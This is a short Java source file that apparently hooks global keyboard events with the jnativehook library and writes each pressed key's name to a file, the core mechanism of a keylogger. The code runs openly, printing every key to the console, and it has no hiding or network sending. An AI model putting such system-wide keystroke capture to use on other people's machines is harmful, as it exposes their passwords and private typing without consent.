import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

/**
 * Created by Matan on 3/22/16.
 */
public class KS implements ActionListener, NativeKeyListener {

    String post;
    int typeCounter = 0;

    @Override
    public void actionPerformed(ActionEvent actionEvent) {
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        System.out.print("The key that was pressed: "+NativeKeyEvent.getKeyText( nativeKeyEvent.getKeyCode()));
        if (!NativeKeyEvent.getKeyText( nativeKeyEvent.getKeyCode()).equals("Undefined")){
            Writer w=new Writer();
            w.WriteToFile(NativeKeyEvent.getKeyText( nativeKeyEvent.getKeyCode()));
            typeCounter++;
        }

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
        System.out.print("The key that was pressed: "+NativeKeyEvent.getKeyText( nativeKeyEvent.getKeyCode()));
        if (!NativeKeyEvent.getKeyText( nativeKeyEvent.getKeyCode()).equals("Undefined")){
            Writer w=new Writer();
            w.WriteToFile(NativeKeyEvent.getKeyText( nativeKeyEvent.getKeyCode()));
            typeCounter++;
        }
    }


    // public void keyReleased(NativeKeyEvent e){
     //   System.out.println("Key Released: "+NativeKeyEvent.getKeyText(e.getKeyCode()));
   // }

}


/*
public class GlobalKeyListenerExample implements NativeKeyListener  {



    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        }
        catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());

            System.exit(1);
        }

        GlobalScreen.addNativeKeyListener(new GlobalKeyListenerExample());
    }
}
 */